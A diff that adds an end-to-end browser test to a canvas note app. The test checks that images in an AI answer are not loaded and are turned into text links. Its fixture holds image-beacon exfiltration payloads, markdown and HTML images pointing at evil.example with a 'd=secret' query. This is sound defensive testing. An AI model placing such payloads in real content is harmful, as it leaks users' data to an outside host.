@@ -458,6 +458,36 @@ test('答えのパネルの「Canvasに残す」で、答えを書式付きの�
   await expect.poll(() => nodeTypes(page)).toEqual(before)
 })
 
+test('答えの本文の外の画像は読み込まず、説明の文字とリンクにする。「Canvasに残す」でも画像を写さない（docs/question-canvas-tools-plan.md の B）', async ({ page }) => {
+  // 外のホストへの要求を見張る（出たら失敗。届かないよう止める）
+  const outside: string[] = []
+  page.on('request', (request) => {
+    if (request.url().includes('evil.example')) outside.push(request.url())
+  })
+  await page.route('**://evil.example/**', (route) => route.abort())
+  const noteId = await openApp(page, (route) => route.fulfill({ json: ANSWER }))
+  const body = '答えです。\n\n![グラフ](https://evil.example/p.png?d=secret)\n\n<img src="https://evil.example/q.png?d=secret" alt="図"> と <video poster="https://evil.example/v.png"></video>'
+  await giveAnswer(page, noteId, { ...ANSWER, body, question: QUESTION, answeredAt: 1 })
+  const corner = await cornerOf(page, noteId)
+  await page.mouse.click(corner.x, corner.y)
+  const view = page.locator('.answer-popover .answer-view-body')
+  await expect(view).toContainText('答えです。')
+  await expect(view.locator('img, video')).toHaveCount(0)
+  await expect(view.locator('a.md-image-link')).toHaveText(['画像：グラフ', '画像：図'])
+  await expect(view.locator('a.md-image-link').first()).toHaveAttribute('href', 'https://evil.example/p.png?d=secret')
+  await page.locator('.answer-view-keep').click()
+  const placed = await page.evaluate(() => {
+    const editor = (window as any).canvcode.editor
+    const id = [...editor.session.get().selectedIds][0] as string
+    return editor.getNode(id).props.paragraphs.map((p: any) => p.runs.map((r: any) => r.text).join('')).join('\n') as string
+  })
+  expect(placed).toContain('画像「グラフ」（https://evil.example/p.png?d=secret）')
+  expect(placed).not.toContain('![')
+  expect(placed).not.toContain('<img')
+  await page.evaluate(() => new Promise((resolve) => setTimeout(resolve, 300)))
+  expect(outside).toEqual([])
+})
+
 test('「続けて聞く」で、元の付箋の下に札付きの AI 付箋を置いて書き始め、送ると前の質問と答えを送る', async ({ page }) => {
   const sent: any[] = []
   const noteId = await openApp(page, accepting(sent))
